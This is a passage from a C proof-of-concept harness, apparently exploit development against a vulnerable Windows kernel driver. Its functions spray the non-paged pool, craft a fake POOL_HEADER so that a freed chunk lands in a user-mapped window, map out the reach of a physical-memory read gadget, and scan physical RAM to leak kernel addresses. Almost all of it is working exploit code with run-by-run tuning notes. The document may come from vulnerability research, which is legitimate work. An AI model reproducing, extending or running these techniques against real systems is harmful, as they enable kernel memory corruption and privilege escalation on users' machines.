        UINT64 v800 = *(volatile UINT64 *)(w1 + 0x800);
        int isZero = 1;
        for (i = 0; i < 0x100; i++) {
            if (w1[i] != 0) { isZero = 0; break; }
        }
        ProofLog(L"[?] post-free window: *(+0x100)=0x%016llx "
                 L"*(+0x800)=0x%016llx first0x100_zeroed=%s",
                 (unsigned long long)v100, (unsigned long long)v800,
                 isZero ? L"yes (zeroing wipes content)" : L"no (content kept)");
    }

    /* pool spray: capture allocs of 0x800 bytes = one NP-pool page grab per
     * call when the bucket is empty; each grab can take the freed PA. The
     * window's raw bytes are the telemetry -- whoever lands there shows
     * through the user PTE. Log every change, cap the dump volume.
     * P3a run-0 data (v2.4): 400 calls produced ZERO changes -- the freed
     * PA (0x13ffee000, high PFN) was never taken: pool expansion most likely
     * consumes the ZEROED page list first and MmFreeContiguousMemory releases
     * to the UNZEROED list; the VM's zeroed pool is deep enough that 400
     * pages of pressure never reach it. v2.5 scales the spray and probes the
     * list question explicitly (LIFO contig re-grab + post-spray zero check). */
    ProofLog(L"[i] starting pool spray: %u x CMD_CAPTURE(len=0x800, PA=0x1000) "
             L"(batch pacing: Sleep(100) every 250)", sprayN);
    for (i = 0; i < (int)sprayN; i++) {
        UINT64 cur;
        if ((i % 250) == 249)
            Sleep(100);          /* give MM + the zeroing thread cycle time */
        if (!DevCmdCapture(0x1000ULL, 0x800, &dr))
            break;   /* transport failure already logged by helper */
        cur = *(volatile UINT64 *)(w1 + 0x08);
        if (cur != last8) {
            last8 = cur;
            changes++;
            if (changes <= 8) {
                tag32 = cur & 0xFFFFFFFFULL;
                ProofLog(L"[+] CHANGE at iter %d: window[+8]=0x%016llx "
                         L"tag32=0x%08x '%c''%c''%c''%c'  hdr: "
                         L"+00=%02x %02x %02x %02x +04=%02x %02x %02x %02x",
                         i, (unsigned long long)cur,
                         (unsigned)((tag32 >> 24) & 0xFF),
                         (unsigned)((tag32 >> 16) & 0xFF),
                         (unsigned)((tag32 >> 8) & 0xFF),
                         (unsigned)(tag32 & 0xFF),
                         w1[0], w1[1], w1[2], w1[3], w1[4], w1[5], w1[6], w1[7]);
            }
        }
        if (*(volatile UINT64 *)(w1 + 0x100) != before0 && changes == 0) {
            changes++;    /* a non-tag field moved first; log it once */
            ProofLog(L"[+] CHANGE at iter %d: painted magic at +0x100 is gone "
                     L"(0x%016llx) -- page reused before a tag appeared at +8",
                     i, (unsigned long long)*(volatile UINT64 *)(w1 + 0x100));
        }
    }
    ProofLog(L"[+] spray done: %d calls, %d window changes observed%ls",
             i, changes, changes ? L" -- PAGE REUSE LIVE (stale window proven)" : L"");
    if (changes)
        ProofLog(L"[+] window now shows: +00-0F = %02x %02x %02x %02x %02x %02x "
                 L"%02x %02x | %02x %02x %02x %02x %02x %02x %02x %02x",
                 w1[0], w1[1], w1[2], w1[3], w1[4], w1[5], w1[6], w1[7],
                 w1[8], w1[9], w1[10], w1[11], w1[12], w1[13], w1[14], w1[15]);

    /* post-spray zeroing re-check: has anything rewritten the page? */
    if (!changes) {
        UINT64 v100 = *(volatile UINT64 *)(w1 + 0x100);
        UINT64 v800 = *(volatile UINT64 *)(w1 + 0x800);
        ProofLog(L"[?] post-spray re-check: *(+0x100)=0x%016llx "
                 L"*(+0x800)=0x%016llx%s",
                 (unsigned long long)v100, (unsigned long long)v800,
                 (v100 == before0 && v800 == before8) ? L" (magics intact)"
                                                      : L" (REWRITTEN)");
        /* List-placement probe: a fresh 1-page contig alloc -- does MM hand
         * our freed PA straight back (contig free-list LIFO)? If YES, the
         * page is OURS to re-assign at will (contig re-grab route); if NO,
         * the page landed on a list the pool does not drain cheaply. */
        {
            CONTIGREQ c3;
            ZeroMemory(&c3, sizeof(c3));
            if (DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c3)) {
                ProofLog(L"[?] LIFO probe: fresh contig PA=0x%llx"
                         L"%ls (window PA=0x%llx)",
                         (unsigned long long)c3.physPa,
                         c3.physPa == c1.physPa ? L" == SAME PAGE (LIFO hit)"
                                                : L" (different page)",
                         (unsigned long long)c1.physPa);
                /* release the probe buffer with its own pair -- fully legit
                 * legs, only kills the PROBE's own user mapping */
                {
                    CONTIGREQ f = c3;
                    DevCmdContigFree(&f);
                }
            } else {
                ProofLog(L"[x] LIFO probe: fresh contig alloc failed");
                rc |= 1;
            }
        }
    }
    return rc;
}

/* v2.6 --s2pool: P3b, the pool-route groom with a CRAFTED header. The MM
 * page-list route (P3a run-0 + v2.5) starves: freed contig pages park on the
 * unzeroed free list, pool expansion drains the zeroed list first, and even
 * the contig allocator re-picks region holes in address order (run-1 LIFO
 * probe: fresh PA 0x13ffea000, freed hole 0x13ffec000 -- same reservation,
 * no LIFO). But the A8 worker's free leg writes straight into the POOL free
 * list, and P2a proved pool accepts a garbage-header free. This run proves
 * the POSITIVE case: a 2-page contig buffer puts the fake POOL_HEADER inside
 * our own window (chunk = page 2, header at page 2 start), so the freed
 * chunk is not garbage -- it is a crafted, legit-looking, attacker-sized
 * pool chunk. Fire = unmap worker at B = KVA_page2+0x10 with a sacrificial
 * donor pair on the unmap legs (the window mapping itself is never
 * touched). Expectation: pool LIFO (one-free-immediate) hands the chunk to
 * the next same-bucket capture alloc, which LANDS INSIDE OUR WINDOW --
 * verified by body overwrite + cross-alias between the window and the
 * capture's own user mapping. Read-only telemetry except the staging and
 * the header craft; no post-fire write. */
static int HarnessS2Pool(void)
{
    CONTIGREQ c1, c3;
    DEVREQ    cr;
    UINT32    st = 0;
    volatile UINT8 *w1;
    UINT64    body2;             /* KVA of the fake chunk's body = KVA1+0x1010 */
    UINT64    hdrTag, hdrUlong;
    int       i, rc = 0, landed = 0;

    Section(L"[P3b] crafted POOL_HEADER free + LIFO landing (v2.6)");
    ProofLog(L"==== --s2pool (pool-route groom, P3b) ====");

    ZeroMemory(&c1, sizeof(c1)); ZeroMemory(&c3, sizeof(c3));
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 2, 1, &c1)) {
        ProofLog(L"[x] contig alloc #1 (2 pages) failed -- nothing fired");
        return 3;
    }
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c3)) {
        ProofLog(L"[x] contig alloc #2 (donor) failed -- nothing fired (c1 leaked)");
        return 3;
    }
    ProofLog(L"[+] window  : KVA=0x%016llx userVa=0x%016llx PA=0x%llx (2 pages, MDL=0x%016llx)",
             (unsigned long long)c1.kva, (unsigned long long)c1.userVa,
             (unsigned long long)c1.physPa, (unsigned long long)c1.mdl);
    ProofLog(L"[+] donor    : KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c3.kva, (unsigned long long)c3.userVa,
             (unsigned long long)c3.mdl);
    w1 = (volatile UINT8 *)(uintptr_t)c1.userVa;
    body2 = c1.kva + 0x1010;   /* B for the A8 fire: header at KVA1+0x1000 */

    /* fake POOL_HEADER at uva1+0x1000 (page 2 start): ULong1 = BlockSize
     * (total bytes incl 0x10 header, /8) | pool index<<16 | pool type<<24.
     * Crafted chunk = 0x800 total (body 0x7F0 + header 0x10) -> ULong1
     * low16 = 0x800/8 = 0x0100; PoolType byte = 0 (NonPagedPool). Tag =
     * 'ADIO' clone. The capture spray's same-size allocs should LIFO-take
     * it (24H2 one-free-immediate). */
    hdrUlong = 0x00000100ULL;
    hdrTag   = 0x41444F49ULL;
    *(volatile UINT64 *)(w1 + 0x1000 + 0x00) = hdrUlong;
    *(volatile UINT32 *)(w1 + 0x1000 + 0x04) = (UINT32)hdrTag;
    *(volatile UINT32 *)(w1 + 0x1000 + 0x08) = 0;
    *(volatile UINT32 *)(w1 + 0x1000 + 0x0C) = 0;
    /* A8 deref legs staged at B+0x08/B+0x10 = uva1+0x1018/0x1020: the
     * sacrificial donor's own pair (proven-benign legit teardown combo). */
    *(volatile UINT64 *)(w1 + 0x1000 + 0x08 + 0x10) = c3.userVa;
    *(volatile UINT64 *)(w1 + 0x1000 + 0x10 + 0x10) = c3.mdl;
    /* landing marker deep in the fake chunk body: the capture alloc's
     * memcpy overwrites it if the chunk gets re-taken */
    *(volatile UINT64 *)(w1 + 0x1000 + 0x140) = 0x324C4F4F5444414DULL;
    ProofLog(L"[+] fake POOL_HEADER staged at uva+0x1000 (readback: ULong1="
             L"0x%08x Tag=0x%08x), landing marker at uva+0x1140 = 0x%016llx",
             (unsigned)*(volatile UINT32 *)(w1 + 0x1000),
             (unsigned)*(volatile UINT32 *)(w1 + 0x1000 + 0x04),
             (unsigned long long)*(volatile UINT64 *)(w1 + 0x1000 + 0x140));

    ProofLog(L"[i] firing unmap worker at B = 0x%016llx: unmap legs = "
             L"sacrificial donor pair, free leg releases the crafted POOL "
             L"chunk (window page 2) into the POOL free list -- no write "
             L"after this line until the landing verdict",
             (unsigned long long)body2);
    if (!DevCmdUnmap(body2, &st)) {
        ProofLog(L"[x] A8 fire transport failure GLE=%lu", GetLastError());
        return 3;
    }
    ProofLog(L"[+] A8 RETURNED status %u -- pool free path accepted the "
             L"crafted header. window +0x1000 (POOL header + link words):", st);
    ProofLog(L"    %02x %02x %02x %02x %02x %02x %02x %02x | %02x %02x %02x %02x "
             L"%02x %02x %02x %02x",
             w1[0x1000], w1[0x1001], w1[0x1002], w1[0x1003],
             w1[0x1004], w1[0x1005], w1[0x1006], w1[0x1007],
             w1[0x1008], w1[0x1009], w1[0x100a], w1[0x100b],
             w1[0x100c], w1[0x100d], w1[0x100e], w1[0x100f]);

    /* LIFO landing: the very next same-bucket alloc should take the chunk
     * back (24H2 one-free-immediate). CMD_CAPTURE(len=0x7F0): the capture's
     * data buffer = 0x7F0 + 0x10 header = 0x800-byte chunk = our bucket. */
    for (i = 0; i < 5 && !landed; i++) {
        if (!DevCmdCapture(0x1000ULL, 0x7F0, &cr))
            break;   /* transport failure logged by the helper */
        {
            UINT64 wview  = *(volatile UINT64 *)(w1 + 0x1010 + 0x40);
            UINT64 cview  = *(volatile UINT64 *)(uintptr_t)(cr.userVa + 0x40);
            UINT64 marker = *(volatile UINT64 *)(w1 + 0x1000 + 0x140);
            if (marker != 0x324C4F4F5444414DULL) {
                landed = 1;
                ProofLog(L"[+] *** LANDING PROVEN: capture #%d's data buffer "
                         L"landed on OUR WINDOW PAGE (marker at uva+0x1140 "
                         L"now = 0x%016llx, overwritten by the landing copy)",
                         i + 1, (unsigned long long)marker);
                ProofLog(L"[+] alias check: window view (+0x1040) = "
                         L"0x%016llx vs capture's own userVa view (+0x40) = "
                         L"0x%016llx -- %ls",
                         (unsigned long long)wview, (unsigned long long)cview,
                         (wview == cview)
                             ? L"SAME BYTES -- dual user view onto ONE live "
                               L"pool chunk: THE GROOM IS A WINDOW"
                             : L"(bodies differ -- partial landing?)");
            }
        }
    }
    if (!landed)
        ProofLog(L"[x] no landing after 5 same-bucket captures -- pool did "
                 L"not LIFO-hand our crafted chunk back; the header/link "
                 L"bytes above say which leg misbehaved");
    return rc;
}

/* v2.7 --physlim: where does the 0xFFF0281C phys-read gadget stop mapping
 * RAM? E1.5 proved PA 0x1000 ok vs PA 0x73c4000 (117MB, the aligned CR3)
 * rejected -- the boundary was never mapped, so the "page-walk gadget DEAD"
 * verdict rests on one failing PA. Anchor: a contig allocation whose PA lands
 * ~5.3GB on this VM; paint a marker through the buffer's OWN user PTE, then
 * read the same PA through the phys gadget and compare bytes. If the gadget
 * maps it, VA->PA translation for any kernel address reopens (CR3 walk) and
 * every route that needed a kernel-side value (the capture block's dataKVA,
 * token pages) is a walk away. Pure read gadget; benign. */
static int HarnessPhysLim(void)
{
    static const UINT64 ladder[] = {
        0x1000ULL,      /*  4KB  -- proven OK class        */
        0x400000ULL,    /* 4MB                            */
        0x1000000ULL,   /* 16MB                           */
        0x4000000ULL,   /* 64MB                           */
        0x7000000ULL,   /* 112MB -- just below the CR3    */
        0x7600000ULL,   /* 118MB -- just above the CR3    */
        0x10000000ULL,  /* 256MB                          */
        0x40000000ULL,  /* 1GB                            */
        0x100000000ULL, /* 4GB                            */
        0x1000000000ULL /* 64GB -- beyond RAM, expect FAIL */
    };
    unsigned    i;
    unsigned    okLow = 0, okHigh = 0;
    CONTIGREQ   anchor[3];
    unsigned    marks = 0;

    ProofLog(L"==== --physlim (PA-range boundary of 0xFFF0281C) ====");

    /* anchor: paint through the buffer's own user PTE, then phys-read */
    ZeroMemory(&anchor, sizeof(anchor));
    for (i = 0; i < 3; i++) {
        CONTIGREQ ca;

        ZeroMemory(&ca, sizeof(ca));
        ca.lowPa  = 0x100000ULL;
        ca.highPa = 0x1000000000ULL;
        ca.pages  = 1;
        ca.cache  = 1;
        if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &ca)) {
            ProofLog(L"[x] anchor alloc #%u failed (detail in the teelog) -- "
                     L"ladder still runs below", i + 1);
            continue;
        }
        if (!ca.userVa || ca.userVa >= 0x800000000000ULL) {
            ProofLog(L"[x] anchor #%u returned PA=0x%012llx but no user VA",
                     i + 1, (unsigned long long)ca.physPa);
            continue;
        }
        *(volatile UINT64 *)(uintptr_t)(ca.userVa + 0x200) =
            0x314D4C4F4F544441ULL + i;   /* AMDTOOL1 + anchor index */
        ProofLog(L"[+] anchor #%u: PA=0x%012llx userVa=0x%016llx "
                 L"KVA=0x%016llx (marker painted via own user PTE)",
                 i + 1, (unsigned long long)ca.physPa,
                 (unsigned long long)ca.userVa,
                 (unsigned long long)ca.kva);
        anchor[marks++] = ca;
    }
    if (!marks) {
        ProofLog(L"[x] no anchor survived -- ladder aborts unanchored");
        return 1;
    }

    for (i = 0; i < (unsigned)(sizeof(ladder) / sizeof(ladder[0])); i++) {
        UINT8  out[0x40];
        UINT64 first = 0;

        if (DevCmdPhysRead(ladder[i], out, 0x40)) {
            memcpy(&first, out, sizeof(first));
            ProofLog(L"[?] phys 0x%012llx = OK, first qword = 0x%016llx",
                     (unsigned long long)ladder[i],
                     (unsigned long long)first);
            (ladder[i] < 0x7400000ULL) ? okLow++ : okHigh++;
        } else {
            ProofLog(L"[?] phys 0x%012llx = FAIL (GLE/status detail in the "
                     L"teelog)", (unsigned long long)ladder[i]);
        }
    }

    /* anchored verdicts: compare the phys read of the anchor PA against the
     * marker we wrote through its user PTE */
    for (i = 0; i < marks; i++) {
        UINT8  out[0x40];
        UINT64 want = 0x314D4C4F4F544441ULL + i;
        UINT64 got = 0;

        if (DevCmdPhysRead(anchor[i].physPa + 0x200, out, 0x40)) {
            memcpy(&got, out, sizeof(got));
            if (got == want) {
                ProofLog(L"[+] *** ANCHOR %u MATCH: phys read at the anchor's "
                         L"own PA (0x%012llx, %.1fGB class) returned the "
                         L"exact user-painted marker 0x%016llx",
                         i + 1, (unsigned long long)anchor[i].physPa,
                         (double)anchor[i].physPa / (1024.0 * 1024.0 * 1024.0),
                         (unsigned long long)got);
            } else {
                ProofLog(L"[!] anchor %u: phys read at its own PA returned "
                         L"0x%016llx, user PTE saw 0x%016llx (stale copy? "
                         L"different page? cache?)", i + 1,
                         (unsigned long long)got, (unsigned long long)want);
            }
        } else {
            ProofLog(L"[x] anchor %u: phys read at its own PA (0x%012llx) "
                     L"FAILED -- MmMapIoSpace rejects this class",
                     i + 1, (unsigned long long)anchor[i].physPa + 0x200);
        }
    }

    ProofLog(L"[i] ladder tally: OK below 117MB = %u/5, OK above 117MB = %u/5 "
             L"(the 0x7600000..0x40000000 slots; the 64GB slot = expected "
             L"FAIL)", okLow, okHigh);
    {
        /* release the anchors with the proven-benign real-pair free */
        for (i = 0; i < marks; i++) {
            CONTIGREQ f = anchor[i];
            if (!DevCmdContigFree(&f))
                ProofLog(L"[x] anchor #%u free failed (detail in the "
                         L"teelog)", i + 1);
        }
        ProofLog(L"[+] anchors released (real-pair contigfree, proven benign "
                 L"in P2b)");
    }
    return 0;
}

/* v2.8 --s2scan: the walk-free leak (E1.6). Run-4 showed the CR3 walk dies
 * on page-table pages (24H2 MmMapIoSpace rejects active PT pages), but the
 * 0xFFF02824 scanner searches PHYSICAL memory -- no walk anywhere. The
 * capture reply's userVa is stored in kernel phys memory only inside the
 * capture 'ADIO' block at +0x08, so:
 *   scan PA space for the qword userVa -> shape-check the hit
 *     -> phys-read 0x40 at  hit-0x08 (the block)
 *     -> block+0x18 = dataKVA   (what the walk was invented to learn).
 * Verification end to end: a contig anchor is painted with a unique marker
 * through the (IDA-verified) 0xFFF02820 direct phys write, the marker is
 * captured into the data buffer, and the leaked data buffer is compared --
 * through the capture's own user window AND a phys read at the anchor --
 * byte for byte. Read-only and benign end to end: no CMD_UNMAP anywhere. */
static int HarnessS2Scan(UINT32 trials)
{
    static const UINT64 kTop = 0x180000000ULL;   /* scan 0..6 GB of phys   */
    static const UINT64 kCap = 0x40;             /* capture len (marker)   */
    UINT8  sbuf[SCAN_LEN], blk[0x40], win[0x40], pa0[0x40];
    UINT64 marker[8];
    UINT32 kWin = 0x10000000;                    /* 256 MB initial window  */
    UINT64 scanBase = 0x100000;                  /* 1 MB: run-6/8 showed no
                                                  * RAM below ~1 MB on this
                                                  * VM -- save the dead
                                                  * crawl (250 floor probes
                                                  * + ladders per trial)  */
    UINT32 t, leaked = 0, verified = 0;
    CONTIGREQ anchor;
    UINT64 anchorPa = 0;
    BOOL   painted = FALSE;
    int    rc = 2;

    Section(L"[P1]/E1.6 walk-free dataKVA leak (0xFFF02824 scan, reads only)");
    LogW(L"[i] route: scan for the capture userVa qword in phys RAM; the "
         L"user-map MDL hit gives dataKVA (StartVa+ByteOffset) AND dataPA "
         L"(PFN[0]<<12|ByteOffset) directly, E2E-verified through the "
         L"capture's own user window; the ADIO block hit (userVa at "
         L"block+0x08) is the fallback -- no page walk either way");
    ProofLog(L"==== --s2scan (walk-free dataKVA leak, E1.6) ====");

    for (t = 0; t < 8; t++)
        marker[t] = 0x1337C0DE00000000ULL + t;
    ZeroMemory(win, sizeof(win));
    ZeroMemory(pa0, sizeof(pa0));

    {
        /* one benign contig anchor: phys-write target for the marker */
        CONTIGREQ ca;
        UINT8 back[0x40];

        if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &ca)) {
            ProofLog(L"[x] anchor contig alloc failed -- no marker stage");
            return 3;
        }
        anchor = ca;
        anchorPa = ca.physPa;
        ProofLog(L"[+] anchor: PA=0x%012llx userVa=0x%016llx KVA=0x%016llx",
                 (unsigned long long)ca.physPa,
                 (unsigned long long)ca.userVa, (unsigned long long)ca.kva);
        LogW(L"[+] anchor PA 0x%012llx", (unsigned long long)ca.physPa);

        painted = DevCmdPhysWrite(anchorPa + 0x200, marker, (UINT32)kCap) &&
                  DevCmdPhysRead(anchorPa + 0x200, back, (UINT32)kCap) &&
                  memcmp(back, marker, kCap) == 0;
        if (painted)
            LogW(L"[+] 0xFFF02820 phys-write verified: marker readback "
                 L"matches (content staging without any map primitive)");
        else
            LogW(L"[!] phys-write marker MISSING (capture falls back to the "
                 L"unpainted PA-0x1000 window; leak still runs, the E2E "
                 L"readback may compare zeros-to-zeros)");

        /* Run-6 decoded the GLE=8 rejections: NOT a size cap -- a MULTI-page
         * MmMapIoSpace fails when the range contains an absent page (a phys
         * hole). 128 MB at 0x40000000 maps because that span is hole-free;
         * 256 MB crosses a hole; 0x102e80000 is a hole START (the halving
         * ladder reconstructed the boundary to the last 4 KB); PA 0x1000
         * windows fail because this VM has no RAM below ~1 MB. Active
         * page-table pages are rejected even single-page (run-4 CR3), and
         * single-page maps work on RAM everywhere (physlim <= 0x100;
         * PhysPaint's A4 0x1000 map at the 5.3 GB anchors). So the floor is
         * 0x1000, not 64 KB. Probe the largest hole-free window at
         * 0x40000000 as the initial guess; the trial loop adapts either way. */
        {
            static const UINT32 kSizes[] = {
                0x10000000,    /* 256 MB -- the size that FAILED in the field */
                0x8000000,     /* 128 MB -- the size that mapped in the field */
                0x4000000,     /*  64 MB */
                0x2000000,     /*  32 MB */
                0x1000000,     /*  16 MB */
                0x800000,      /*   8 MB */
                0x400000,      /*   4 MB */
                0x200000,      /*   2 MB */
                0x100000,      /*   1 MB */
                0x10000,       /*  64 KB */
                0x2000,        /*   8 KB */
                0x1000,        /*   4 KB -- floor: 1-page maps work on RAM */
            };
            UINT32 i, stP = 0;
            UINT64 hitP = 0;

            kWin = 0;
            for (i = 0; i < 12; i++) {
                if (DevCmdScan(0x40000000ULL, kSizes[i], 8, 8, 0x40,
                               &marker[0], sbuf, &stP, &hitP)) {
                    kWin = kSizes[i];
                    LogW(L"[+] scan-size probe: window 0x%08x maps + scans "
                         L"OK (status %u) -> window size = %lu MB", kWin,
                         stP, (unsigned long)(kWin >> 20));
                    break;
                }
                LogW(L"[x] scan-size probe: window 0x%08x MmMapIoSpace "
                     L"rejected (GLE=8) -- shrinking", kSizes[i]);
            }
            if (!kWin) {
                LogW(L"[x] even a 4 KB scan window is rejected at "
                     L"0x40000000 -- the scanner gadget itself can't map "
                     L"here; send the log");
                ProofLog(L"[x] --s2scan: scan-window size probe failed at "
                         L"every size (4 KB floor)");
                DevCmdContigFree(&anchor);
                return 3;
            }
            /* start-PA check with the winning size: informational only
             * (scanBase is fixed at 1 MB -- run-6/8 proved there is no RAM
             * below ~1 MB to crawl through) */
            {
                UINT32 stQ = 0;
                UINT64 hitQ = 0;

                if (DevCmdScan(0, kWin, 8, 8, 0x40, &marker[0], sbuf, &stQ,
                               &hitQ))
                    LogW(L"[+] scan-start probe: window at PA 0 (size 0x%x) "
                         L"maps OK (status %u)", kWin, stQ);
                else
                    LogW(L"[i] scan-start probe: PA 0 rejected at size 0x%x "
                         L"(no low RAM) -- windows start at 1 MB", kWin);
            }
        }
    }

    for (t = 0; t < trials; t++) {
        DEVREQ cap;
        UINT64 pattern = 0, hitPa = 0, dataKVA = 0, mdlKva = 0;
        UINT32 st = 0, winSize = kWin;
        BOOL   found = FALSE, mdlRoute = FALSE;
        UINT32 scanCalls = 0, falseHits = 0, mdlHits = 0;
        BOOL   verifiedNow = FALSE;
        UINT64 capPa = painted ? anchorPa + 0x200 : 0x1000;
        UINT64 scanned = scanBase;
        UINT32 floorFails = 0, okWins = 0;   /* unmappable / clean windows   */
        UINT32 deadStreak = 0, okStreak = 0; /* consecutive since last change*/
        UINT32 deadAdv = 0x1000;             /* dead-zone step, doubles      */
        UINT64 bytesScanned = 0;
        UINT64 dataPa = 0;                   /* v3.1: from the MDL's PFN[0]  */
        UINT32 maxWin = 0;                   /* largest clean window mapped  */

        ZeroMemory(&cap, sizeof(cap));
        if (!DevCmdCapture(capPa, (UINT32)kCap, &cap))
            return 3;
        pattern = cap.userVa;
        if (!pattern) {
            LogW(L"[x] trial %u: capture returned userVa 0 -- nothing to scan "
                 L"for", t);
            continue;
        }
        LogW(L"    [E1.6] trial %u: block=0x%016llx userVa=0x%016llx "
             L"(scan pattern)", t, (unsigned long long)cap.block,
             (unsigned long long)cap.userVa);

        while (scanned < kTop && !found) {
            UINT64 start = scanned;
            UINT32 mapLen = winSize;
            UINT64 tail = 0x100000000ULL - (start & 0xFFFFFFFFULL);

            /* never cross a 4 GB boundary: the driver's walk compare is a
             * 32-bit PA-low-dword, so a range that reaches exactly 2^32
             * wraps the sum to 0 and scans nothing -- keep the window at
             * least 8 bytes short of the edge so the last qword (4 GB-8)
             * stays inside */
            if (tail < 0x2000) {
                /* nothing worth a window at the 4 GB edge: jump past it */
                scanned = (start & ~0xFFFFFFFFULL) + 0x100000000ULL;
                winSize = kWin;      /* fresh geometry past the edge */
                continue;
            }
            if ((UINT64)mapLen > tail - 8)
                mapLen = (UINT32)(tail - 8);
            if (!DevCmdScan(start, mapLen, 8, 8, (UINT32)kCap, &pattern,
                            sbuf, &st, &hitPa)) {
                if (winSize > 0x1000) {
                    UINT32 half = winSize / 2;

                    if (half < 0x1000)
                        half = 0x1000;
                    LogW(L"[?] trial %u: window at 0x%012llx unmappable "
                         L"at 0x%x -- halving to 0x%x", t,
                         (unsigned long long)start,
                         (unsigned long)winSize, (unsigned long)half);
                    winSize = half;
                    continue;
                }
                /* the 0x1000 floor window itself is rejected: this PA is
                 * unmappable at ANY size (absent page / phys hole). Step
                 * past it -- exponentially on a streak (1 page, 2, 4 ...
                 * capped at 1 MB). NO 4 GB jump: run-6's jump discarded the
                 * entire < 4 GB band, the exact region where NP pool lives
                 * (capture blocks 0xffff980a...). Wide skips stay correct:
                 * each skipped position costs only the next window's single
                 * floor probe. */
                floorFails++;
                deadStreak++;
                if (deadStreak == 1)
                    LogW(L"[!] trial %u: PA 0x%012llx unmappable even at "
                         L"the 0x1000 floor (absent page) -- stepping "
                         L"past", t, (unsigned long long)start);
                scanned += deadAdv;
                if (deadAdv < 0x100000)
                    deadAdv <<= 1;
                continue;
            }
            scanCalls++;
            if (st == 0) {
                /* hit: phys-read the 0x40 bytes that begin at hit-0x08 and
                 * decide what we landed on */
                UINT64 q0, q1, q2, q3, q4;

                if (!DevCmdPhysRead(hitPa - 8, blk, 0x40))
                    break;
                q0 = *(UINT64 *)(blk + 0x00);
                q1 = *(UINT64 *)(blk + 0x08);
                q2 = *(UINT64 *)(blk + 0x10);
                q3 = *(UINT64 *)(blk + 0x18);
                q4 = *(UINT64 *)(blk + 0x20);
                deadStreak = 0;
                deadAdv = 0x1000;
                okStreak = 0;
                if (blk[0] == (UINT8)kCap && KernelCanonical(q2) &&
                    KernelCanonical(q3) && q1 == pattern) {
                    /* the block: +0x08 userVa (the pattern), +0x10 MDL,
                     * +0x18 dataKVA */
                    found = TRUE;
                    mdlKva = q2;
                    dataKVA = q3;
                    LogW(L"        hit 0x%012llx = the capture BLOCK "
                         L"(tag=0x%02x MDL=0x%016llx): DATAKVA = "
                         L"0x%016llx -- LEAKED",
                         (unsigned long long)hitPa, blk[0],
                         (unsigned long long)q2, (unsigned long long)q3);
                } else if (KernelCanonical(q0) && q1 == pattern &&
                           KernelCanonical(q2) &&
                           (q3 & 0xFFFFFFFFULL) == kCap) {
                    /* the user-map MDL over the DATA BUFFER: the read above
                     * began at MDL+0x08 (the pattern sits in the MDL's
                     * MappedSystemVa field at MDL+0x10, so hit = mdlPa+0x10):
                     *   q0 = MDL+0x08 Process -- in this build it holds the
                     *         ADIO block KVA, NOT an EPROCESS (run-8 log),
                     *   q1 = +0x10 MappedSystemVa = the scan pattern,
                     *   q2 = +0x18 StartVa,
                     *   q3 = +0x20 lo32 ByteCount / hi32 ByteOffset,
                     *   q4 = +0x28 PFN[0] -- filled by
                     *         MmBuildMdlForNonPagedPool.
                     * => dataKVA = StartVa + ByteOffset and
                     *    dataPA  = (PFN[0] << 12) + ByteOffset: the leak's
                     * whole payload (KVA + PA) -- P3e paints through dataPA.
                     * Verify end to end before believing it: the live user
                     * window must read byte-identical to phys at dataPA. */
                    UINT64 dataVa  = q2 + (q3 >> 32);
                    UINT64 probePa = ((q4 & 0xFFFFFFFFULL) << 12) +
                                     (q3 >> 32);
                    UINT8  tmp[0x40], usr[0x40];
                    SIZE_T br = 0;
                    UINT32 clip = (UINT32)(0x1000ULL - (probePa & 0xFFF));
                    BOOL   bUsr, bPhys;

                    mdlHits++;
                    mdlRoute = TRUE;
                    if (clip > 0x40) clip = 0x40;
                    bUsr = ReadProcessMemory(GetCurrentProcess(),
                                             (LPCVOID)(ULONG_PTR)cap.userVa,
                                             usr, clip, &br) && br == clip;
                    bPhys = bUsr && DevCmdPhysRead(probePa, tmp,
                                                   (UINT32)clip) &&
                            memcmp(usr, tmp, clip) == 0;
                    LogW(L"        hit 0x%012llx = the user-map MDL: "
                         L"StartVa=0x%016llx ByteOffset=%llu PFN0=0x%08llx "
                         L"=> dataKVA 0x%016llx dataPA 0x%012llx %ls",
                         (unsigned long long)hitPa,
                         (unsigned long long)q2,
                         (unsigned long long)(q3 >> 32),
                         (unsigned long long)(q4 & 0xFFFFFFFFULL),
                         (unsigned long long)dataVa,
                         (unsigned long long)probePa,
                         bPhys ? L"-- buffer PA verify MATCH (user window "
                               L"== phys at dataPA)"
                               : bUsr ? L"-- buffer PA verify MISMATCH "
                                      L"-- resuming"
                                      : L"-- user window unreadable");
                    if (bPhys) {
                        found = TRUE;
                        dataKVA = dataVa;
                        dataPa = probePa;
                    } else {
                        falseHits++;
                        scanned = hitPa + 8;
                    }
                } else {
                    falseHits++;
                    LogW(L"        hit 0x%012llx shape-check failed "
                         L"(q0=0x%016llx q1=0x%016llx) -- false positive, "
                         L"resuming", (unsigned long long)hitPa,
                         (unsigned long long)q0, (unsigned long long)q1);
                    scanned = hitPa + 8;
                }
            } else if (st == 3) {
                /* window mapped + scanned clean (these were SILENT in
                 * run-6, leaving "6 scan calls" opaque -- now counted) */
                scanned += mapLen;
                bytesScanned += mapLen;
                okWins++;
                if (mapLen > maxWin)
                    maxWin = mapLen;
                if (mapLen >= 0x400000)
                    LogW(L"[i] trial %u: clean window 0x%012llx..+0x%x "
                         L"(status 3)", t, (unsigned long long)start,
                         mapLen);
                okStreak++;
                deadStreak = 0;
                deadAdv = 0x1000;
                if (winSize < kWin && okStreak >= 8) {
                    /* geometry opened up: regrow one doubling per 8 clean
                     * windows; a wrong guess costs one halving round */
                    UINT32 grown = winSize * 2;

                    winSize = grown > kWin ? kWin : grown;
                    okStreak = 0;
                }
            } else {
                LogW(L"[!] trial %u: scan status %u from PA 0x%012llx "
                     L"(5 = dump map failure) -- advancing past this window",
                     t, st, (unsigned long long)start);
                scanned += mapLen;
                bytesScanned += mapLen;
                okWins++;
                deadStreak = 0;
                deadAdv = 0x1000;
            }
        }

        if (found) {
            /* end-to-end check: the leaked data buffer's own user window
             * (mapped into THIS process by the capture call) must show the
             * same 0x40 bytes as a phys read at the capture source */
            SIZE_T br = 0;
            BOOL   bWin, bPhys;
            UINT8 *cmpPa = win, *cmpPhys = pa0;

            bWin = ReadProcessMemory(GetCurrentProcess(),
